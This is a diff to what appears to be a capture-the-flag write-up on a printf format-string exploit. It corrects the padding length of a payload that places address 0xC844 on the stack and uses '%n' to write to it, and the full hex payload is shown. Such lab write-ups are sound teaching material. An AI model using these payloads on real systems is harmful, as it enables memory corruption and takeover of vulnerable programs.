@@ -98,9 +98,9 @@ So what I'm thinking is doing something like this
 The function `printf` will count the number of format specifiers, and then expect variadic variables on the stack to use as the params to the format specifiers. Here what we are doing is placing the address we want to write to in the right location so that it is popped off the stack as the format specifier for `%n` (a little bit of trial and error involved as well).
 
 So I end up with something that looks like this:
-`<0xC844> <(0x7F - 4) random characters> <"%n">`
+`<0xc844> <(0x7F - 2) random characters> <"%n">`
 
-`c844 <0x7B (123) characters> 256e`
+`c844 <0x7D (125) characters> 256e`
 
 `c844a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5256e`
 
